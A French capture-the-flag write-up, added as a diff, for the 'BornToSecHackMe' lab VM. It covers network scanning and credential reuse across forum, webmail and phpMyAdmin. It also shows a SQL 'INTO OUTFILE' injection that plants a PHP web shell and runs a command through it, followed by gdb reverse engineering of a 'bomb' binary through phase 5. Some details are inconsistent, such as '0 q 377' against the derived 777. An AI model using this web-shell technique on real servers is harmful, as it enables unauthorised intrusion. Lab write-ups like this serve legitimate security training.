@@ -1,0 +1,414 @@
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+
+WRITEUP_1
+
+_______________________________________________________________________________
+
+								SSH TO LAURIE
+_______________________________________________________________________________
+
+
+>$ ifconfig
+
+Pour recuperer l'ip de la machine host pour ensuite trouve avec nmap l'ip
+de la machine guest 'born2sec'
+
+$> nmap IP.HOST.MACHINE.0-255
+
+Nous avons desormais l'ip de la VM et on constate les ports ouverts :
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+
+Nous allons ensuite tester les ports ouverts, lister les services et les repertoires.
+
+$> nmap -sV IP.GUEST.MACHINE --script=http-enum
+
+443/tcp open  ssl/http Apache httpd 2.2.22
+| http-enum:
+|   /forum/: Forum
+|   /phpmyadmin/: phpMyAdmin
+|   /webmail/src/login.php: squirrelmail version 1.4.22
+|_  /webmail/images/sm_logo.png: SquirrelMail
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+
+Nous obtenons une arborescence partielle de ce qui semble etre un site web.
+
+Nous nous rendons donc sur ce fameux forum : https://IP.GUEST.MACHINE/forum et
+debutons son exploration :
+
+	- On constate que la section 'Probleme login ?' est un fichier de log et dans
+		celui-ci on trouve ce qui semble etre un mot de passe : !q\]Ej?*5K5cy*AJ
+	- Ce mot de passe nous permet de connecter au forum en tant que user 'lmezard'
+	- Dans la section 'Edit Profil' de lmezard on trouve l'adresse mail de lmezard :
+		laurie@born2sec.net
+	- Dans le footer du forum on peut lire powered by my little forum, en s'y
+	interessant on atterit sur un github et une doc qui nous indique :
+	"Depending on your server configuration the write permissions of the
+	subdirectory templates_c (CHMOD 770, 775 or 777) and the file
+	config/db_settings.php (CHMOD 666) might need to be changed in order that
+	they are writable by the script."
+	(Ce qui nous sera utile pour la suite)
+
+
+Nous allons maintenant explorer le dossier webmail que nous avons trouve plus
+haut dans l'arborescence https://IP.GUEST.MACHINE/webmail
+
+	- On peut se connecter via l'adresse mail trouvee precedement et le mot de
+	passe est le meme.
+	- Dans le mail DB access, on trouve des identifiants nous permettant de nous
+	connecter en tant que root a la bdd  root:Fg-'kKXBj87E:aJ$
+
+Nous basculons sur https://IP.GUEST.MACHINE/phpmyadmin et nous nous connectons
+avec les identifiants trouves, nous allons profiter de la permission d'ecriture
+dans le dossier templates_c trouve plus haut pour y effectuer une injection sql:
+
+	- SELECT "<? system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/shell.php";
+	- https://IP.GUEST.MACHINE/shell.php?cmd=cat /home/LOOKATME/password
+
+Nous trouvons un mot de passe associe a lmezard : G!@M6f4Eatau{sF"
+On se connecte au serveur ftp en tant que lmezard et le mot de passe trouve puis on
+telecharge les deux fichiers trouves : fun, README.
+
+$> file fun
+
+Nous revele la nature du fichier : .tar (archive), nous allons le renomme avec la bonne extension
+puis nous allons le desarchiver.
+
+$> mv fun fun.tar
+$> tar -xvf fun.tar
+
+Nous obtenons des centaines de fichier .pcap
+
+$> file BJPCP.pcap
+
+Nous savons desormais que le .pcap n'est qu'un leurre, ce sont en realite des fichiers text et
+BJPCP.pcap est le plus volumineux d'entre eux.
+
+Un petit jeu d'appel de fonctions s'effectue vie les fonctions getme():
+
+~/ft_fun » grep "getme1()" *
+331ZU.pcap:char getme1() {
+BJPCP.pcap:	printf("%c",getme1());
+
+~/ft_fun » cat 331ZU.pcap
+char getme1() {
+//file5%-
+
+~/ft_fun » grep "file6$" *
+APM1E.pcap://file6
+
+~/ft_fun » cat APM1E.pcap
+	return 'I';
+//file6%
+
+Voici la marche a suivre pour obtenir la premiere lettre, a repeter jusqu'a la 7eme lettre inclus.
+De la 8eme a la 12eme inclus, elles sont en clair dans le fichier BJPCP.pcap
+Nous obtenons donc "Iloveheartpwnage" a hasher en SHA-256 comme indiquer a la derniere ligne du main.
+Password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+Nous pouvons desormais nous connecter en SSH avec le user laurie! Amazing
+
+
+_______________________________________________________________________________
+
+								SSH TO THOR
+_______________________________________________________________________________
+
+
+
+BOMB!
+
+Il s'agit d'un binaire, une bombe a desamorcer en plusieurs etapes.
+Elle doit etre desamorce grace a une serie de mot de passe qui selon le README doivent etre assemble pour
+se connecter a thor en ssh.
+
+Nous lancons gdb sur bomb, un break sur le main puis un disas et on se rend compte que la bomb contient
+bien 6 phases de desamorcage comme indique au lancement du binaire (phase_1/6).
+Nous allons pouvoir break par la suite a chacune d'entre elles pour les resoudres.
+
+						** _phase_1: **
+
+Nous lancons gdb, puis break a la phase_1.
+
+   0x08048b2c <+12>:	push   $0x80497c0
+   0x08048b31 <+17>:	push   %eax
+   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
+
+Nous constatons que deux valeurs sont push avant un appel de fonctions explicite qui compare 2 strings.
+
+(gdb) x /s  $eax
+0x804b680 <input_strings>:	 "sakhgoa gag"
+(gdb) x /s 0x80497c0
+0x80497c0:	 "Public speaking is very easy."
+
+Dans eax est stocker la chaine de charactere que nous avons rentrer, et dans l'autre variable push,
+la string a laquelle est comparee.
+
+$> laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+
+Phase 1 desamorcee, passons a la suivante.
+
+
+						** _phase_2: **
+
+Nous lancons gdb, puis break a la phase_2.
+
+Un disas sur la fonction read_six_numbers appelee nous permet de voir qu'une variable est push
+avant l'appel a sscanf, nous allons affiche son contenu.
+
+	(gdb) x /s 0x8049b1b
+	0x8049b1b:	 "%d %d %d %d %d %d"
+
+	Nous avons le format du password.
+
+Le premier cmpl permet de verifier que notre premier chiffre est bien 1, 4 etant la valeur que nous avons entrer.
+Nous avons notre premier chiffre:
+
+	=> 0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
+
+	(gdb) x /d (0xbffff6e8 - 0x18)
+	0xbffff6d0:	4
+
+Le deuxieme cmp, compare la valeur stockee dans %eax avec la valeur que nous avons entree, stocker dans l'adresse : ($esi + $ebx * 4);
+Si les deux nombres ne sont pas identiques la bombe explose.
+Nous mettons un break juste avant le cmp, et nous affichons $eax, il nous suffit de repeter cette manipulation a chaque tour de boucle.
+Nous otenons : 1 2 6 24 120 720
+
+Nous remarquons d'ailleurs que dans le README le placement des lettres est un indice de chaque mot de passe.
+'P'ublic speaking is very easy.
+ 1 '2' 6 24 120 720
+
+Cela nous sera utile pour la suite.
+
+
+						** _phase_3: **
+
+
+Nous lancons gdb.. blabla
+
+Une valeur est push avant l'appel a sscanf comme precedemment:
+	0x08048bb1 <+25>:	push   $0x80497de
+
+	(gdb) x /s 0x80497de
+	0x80497de:	 "%d %c %d"
+
+Nous avons le format du password.
+
+Grace aux hints du README, on sait d'hors et deja que le char au milieu est un 'b'
+
+Le cmpl ici present verifie que notre chiffre est inferieur ou egal a 7 si ce
+n'est pas le cas il jump a +240 et la bombe explose.
+   0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
+   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
+
+La valeur de notre 1er chiffre est ensuite stockee dans eax.
+	0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
+
+L'instruction qui va suivre est importante:
+	0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
+
+En effet, en fonction du 1er chiffre choisi l'adresse de jump sera differente
+et donc respectivement les valeurs du %c et %d seront differentes, OUI il y a
+bien plusieurs solutions de possibles.
+
+Exemple pour 0 en premier nombre:
+
+	(gdb) x /x (0x80497e8 + 0*4) // Multiplication inutile mais pour l'exemple.
+	0x80497e8:	0x08048be0
+
+Nous jumpons donc a l'adresse 0x08048be0.
+   0x08048be0 <+72>:	mov    $0x71,%bl
+
+Ici 0x71 representant 113 et donc la lettre 'q' dans la table Ascii est stockee dans bl.
+
+Ensuite cmpl compare 0x309 au nombre que nous avons entre apres le char.
+   0x08048be2 <+74>:	cmpl   $0x309,-0x4(%ebp)
+0x309 correspondant a 777.
+
+Si la condition est remplie et que nous avons bien entrer 777, jump sinon la bombe explose.
+   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
+
+Le jump effectue nous atterisson ici et la derniere verification a lieu entre la lettre que nous avons rentrer
+et celle stockee automatiquement dans bl precedemment qui correspondait a 'q'.
+   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
+
+Nous aurons donc la combinaison 0 q 377.
+
+laurie@BornToSecHackMe:~$ ./bomb aaaaaa (fichier avec les precedents mdp)
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+0 q 777
+Halfway there!
+
+Il ne nous reste plus qu'a repeter les operations avec les 8 chiffres de 0 a 7 et nous aurons differents mot de passe.
+
+Celui qui nous concerne est '1 b 214' au vue de l'indice dans le README.
+
+
+
+						** _phase_4 **
+
+
+Nous lancons gdb.. blabla
+
+Nous constatons ici qu'une valeur est push avant un appel a sscanf
+	 0x08048cf0 <+16>:	push   $0x8049808
+
+	(gdb) x /s 0x8049808
+	0x8049808:	 "%d"
+
+
+Une suite d'instruction attire notre attention:
+
+   0x08048d14 <+52>:	push   %eax
+   0x08048d15 <+53>:	call   0x8048ca0 <func4>
+   0x08048d1a <+58>:	add    $0x10,%esp
+   0x08048d1d <+61>:	cmp    $0x37,%eax
+   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
+   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
+
+eax est push avant un appel a func4, il est ensuite comparer a 0x37, 55 en decimal et dans le cas
+ou il serait different de 55 la bombe exploserait.
+
+Nous allons inspecter cette func4.
+
+	0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
+	0x08048cab <+11>:	cmp    $0x1,%ebx
+	0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
+
+La premiere information est ici, une comparaison entre l'entier que nous avons entrer et 1
+Si la condition n'est pas rempli on jump et on se retrouve ici :
+
+	0x08048cd0 <+48>:	mov    $0x1,%eax
+
+eax sera set a 1 et sera return.
+
+Nous inspectons la suite:
+
+   0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
+   0x08048cb6 <+22>:	push   %eax
+   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
+   0x08048cbc <+28>:	mov    %eax,%esi
+   0x08048cbe <+30>:	add    $0xfffffff4,%esp
+   0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
+   0x08048cc4 <+36>:	push   %eax
+   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
+   0x08048cca <+42>:	add    %esi,%eax
+
+La portion de code qui nous interesse est ici, lea va decrementer ebx, la valeur passee en parametre puis la stocker dans eax
+puis va rappeler func4, elle continuera jusqu'a ce qu'eax vale 1.
+Puis le procede est repetee en decrementant de 2 cette fois, puis la somme de esi et eax sera effectuee.
+Nous pouvons clairement identifie la recursive : func4(x - 1) puis func4(x - 2). et enfin la somme des deux - func4(x - 1) + func4(x - 2)
+On identifie clairement le principe de la suite de fibonnaci, Puis le resultat est return a phase_4
+
+De retour dans la phase_4:
+
+	0x08048d1d <+61>:	cmp    $0x37,%eax
+	0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
+	0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
+
+Le resultat de func4 est compare a 0x37, soit 55 en decimal.
+55 correspond dans la suite de fibonnaci a f(10), seulement notre suite commence a f(1) et non f(0)
+comme on a pu le voir dans la condition de fin de recursive, si f(x) <= 1 on return 1, donc f(0) dans notre binaire vaut 1.
+Nous donc decaler de 1 notre resultat et nous obtenons f(9) = 55
+
+laurie@BornToSecHackMe:~$ ./bomb aaaa
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+Halfway there!
+9
+So you got that one.  Try this one.
+
+Done!
+
+
+
+						** _phase_5 *
+
+
+Nous lancons gdb.. blabla
+
+Premier apercu de phase_5:
+
+	0x08048d3a <+14>:	push   %ebx
+	0x08048d3b <+15>:	call   0x8049018 <string_length>
+	0x08048d40 <+20>:	add    $0x10,%esp
+	0x08048d43 <+23>:	cmp    $0x6,%eax
+	0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
+	0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
+
+Nous voyons ici ebx qui contient notre string qui est push puis un appel a string_length
+Assez explicite, une fonction qui calcule la taille de notre chaine.
+Un cmp ensuite qui permet de verifier que celle-ci est bien egale a 6 ou bien la bombe explose.
+
+Continuons :
+
+	0x08048d65 <+57>:	inc    %edx
+	0x08048d66 <+58>:	cmp    $0x5,%edx
+	`0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
+
+Nous constatons par la suite que edx est incremente et qu'ensuite un jump a <phase_5+43> est effectue si edx et inferieur ou egal a 5.
+Nous en concluons qu'une boucle est effectue sur chaque char de notre string.
+
+La suite :
+
+   0x08048d72 <+70>:	push   $0x804980b
+   0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
+   0x08048d7a <+78>:	push   %eax
+   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
+   0x08048d80 <+84>:	add    $0x10,%esp
+   0x08048d83 <+87>:	test   %eax,%eax
+   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
+   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
+
+	(gdb) x /s 0x804980b
+	0x804980b:	 "giants"
+
+Nous voyons ici qu'une string "giants" est push avant l'appel a la fonction string not equal et que le resultat de celle-ci est compare a notre string.
+En sortie de fonction notre string "abcdef" vaut "srveaw", nous avons donc une fonction qui hash notre chaine nous allons donc etablie un tableau pour trouver le mot de passe.
+
+--------------------------------------------------------------------------------------------------------
+| a | b | c | d | e | f | g | h | i | j | k | l | m | n | o | p | q | r | s | t | u | v | w | x | y | z |
+---------------------------------------------------------------------------------------------------------
+| s | r | v | e | a | w | h | o | b | p | n | u | t | f | g | i | s | r | v | e | a | w | h | o | b | p |
+---------------------------------------------------------------------------------------------------------
+
+Nous obtenons donc plusieurs mot de passes possible : op[eu]km[aq]
+
+laurie@BornToSecHackMe:~$ ./bomb aaaa
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+Halfway there!
+So you got that one.  Try this one.
+opekma
+Good work!  On to the next...
+
+Phase suivante...
+
+
+
+						** _phase_6 *
+
+
+
